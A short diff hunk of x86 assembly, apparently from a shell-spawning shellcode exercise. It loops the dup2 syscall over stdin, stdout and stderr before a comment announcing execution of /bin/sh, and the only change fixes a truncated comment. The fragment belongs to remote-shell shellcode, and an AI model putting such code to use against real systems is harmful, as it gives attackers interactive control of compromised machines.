@@ -54,7 +54,7 @@ _start:
 looper:
        mov al, 0x3F    ; inserting the hex SYS_DUP2 syscall
        int 0x80        ; syscall
-       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-s$
+       dec ecx         ; the argument for file descriptor(2-stderr,1-stdout,0-stdin)
        jns looper
 
 ; Execute /bin/sh with execve
